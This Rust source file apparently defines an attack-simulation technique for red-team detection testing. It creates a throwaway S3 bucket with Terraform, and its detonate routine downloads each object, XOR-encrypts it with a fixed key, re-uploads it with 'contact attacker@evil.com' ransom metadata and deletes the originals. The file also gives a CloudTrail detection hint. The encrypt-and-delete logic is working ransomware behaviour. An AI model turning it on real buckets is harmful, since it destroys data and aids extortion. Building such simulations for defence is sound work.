use std::collections::HashMap;
use std::sync::Arc;
use anyhow::Result;
use base64::{engine::general_purpose::STANDARD as BASE64, Engine as _};

use crate::platform::Platform;
use crate::providers::CloudProviders;
use crate::tactic::MitreTactic;
use crate::technique::{AttackTechnique, BoxFuture};

const TERRAFORM: &str = r#"
terraform {
  required_providers {
    aws    = { source = "hashicorp/aws",    version = "~> 5.0" }
    random = { source = "hashicorp/random", version = "~> 3.0" }
  }
}

resource "random_string" "suffix" {
  length  = 8
  special = false
  upper   = false
}

resource "aws_s3_bucket" "target" {
  bucket        = "stratus-red-team-s3-ransom-enc-${random_string.suffix.result}"
  force_destroy = true
}

resource "aws_s3_object" "files" {
  count   = 5
  bucket  = aws_s3_bucket.target.id
  key     = "file-${count.index}.txt"
  content = "sensitive data ${count.index}"
}

output "bucket_name" {
  value = aws_s3_bucket.target.bucket
}
"#;

/// XOR-encrypt bytes with a repeating key.
fn xor_encrypt(data: &[u8], key: &[u8]) -> Vec<u8> {
    data.iter()
        .enumerate()
        .map(|(i, &b)| b ^ key[i % key.len()])
        .collect()
}

async fn detonate_impl(outputs: HashMap<String, String>, providers: Arc<CloudProviders>) -> Result<()> {
    let aws = providers.aws().await?;
    let bucket = outputs
        .get("bucket_name")
        .ok_or_else(|| anyhow::anyhow!("missing output: bucket_name"))?;

    // Use a fixed "ransomware" key — in a real attack this would be ephemeral and discarded
    let ransom_key = b"STRATUS_RANSOM_KEY_DO_NOT_REUSE!";
    let key_b64 = BASE64.encode(ransom_key);

    println!(
        "Starting client-side encryption ransomware simulation on bucket '{}'.",
        bucket
    );
    println!(
        "Encryption key (base64, discarded after simulation): {}",
        key_b64
    );

    // List all objects
    let list_resp = aws
        .s3
        .list_objects_v2()
        .bucket(bucket)
        .send()
        .await
        .map_err(|e| anyhow::anyhow!("{}", e))?;

    let keys: Vec<String> = list_resp
        .contents()
        .iter()
        .filter_map(|obj| obj.key().map(|k| k.to_string()))
        .collect();

    if keys.is_empty() {
        println!("No objects found in bucket '{}'.", bucket);
        return Ok(());
    }

    for key in &keys {
        // Step 1: Download the object (GetObject)
        let get_resp = aws
            .s3
            .get_object()
            .bucket(bucket)
            .key(key)
            .send()
            .await
            .map_err(|e| anyhow::anyhow!("GetObject '{}': {}", key, e))?;

        let body_bytes = get_resp
            .body
            .collect()
            .await
            .map_err(|e| anyhow::anyhow!("reading body of '{}': {}", key, e))?
            .into_bytes();

        // Step 2: Encrypt the bytes client-side (XOR)
        let encrypted = xor_encrypt(&body_bytes, ransom_key);

        // Step 3: Upload encrypted version with a new key prefix (PutObject)
        let encrypted_key = format!("encrypted/{}.enc", key);
        aws.s3
            .put_object()
            .bucket(bucket)
            .key(&encrypted_key)
            .body(aws_sdk_s3::primitives::ByteStream::from(encrypted))
            .metadata("ransom-key-hint", "contact attacker@evil.com")
            .send()
            .await
            .map_err(|e| anyhow::anyhow!("PutObject '{}': {}", encrypted_key, e))?;

        // Step 4: Delete the original (DeleteObject)
        aws.s3
            .delete_object()
            .bucket(bucket)
            .key(key)
            .send()
            .await
            .map_err(|e| anyhow::anyhow!("DeleteObject '{}': {}", key, e))?;

        println!(
            "Encrypted '{}' -> '{}' and deleted original.",
            key, encrypted_key
        );
    }

    println!(
        "Client-side encryption ransomware simulation complete. {} files encrypted, originals deleted.",
        keys.len()
    );

    Ok(())
}

fn detonate(outputs: HashMap<String, String>, providers: Arc<CloudProviders>) -> BoxFuture<Result<()>> {
    Box::pin(detonate_impl(outputs, providers))
}

inventory::submit! {
    AttackTechnique {
        id: "aws.impact.s3-ransomware-client-side-encryption",
        friendly_name: "S3 Ransomware: Client-Side Encryption of S3 Objects",
        description: "Downloads S3 objects, encrypts them client-side with XOR (simulating AES-256 ransomware), re-uploads the encrypted files with a new key prefix, then deletes the originals. Simulates a ransomware attack pattern that generates a sequence of GetObject, PutObject, and DeleteObject CloudTrail events.",
        detection: "CloudTrail: Multiple GetObject + PutObject + DeleteObject calls in sequence.",
        platform: Platform::Aws,
        mitre_tactics: &[MitreTactic::Impact],
        is_idempotent: false,
        is_slow: false,
        prerequisite_tf: Some(TERRAFORM),
        detonate,
        revert: None,
    }
}
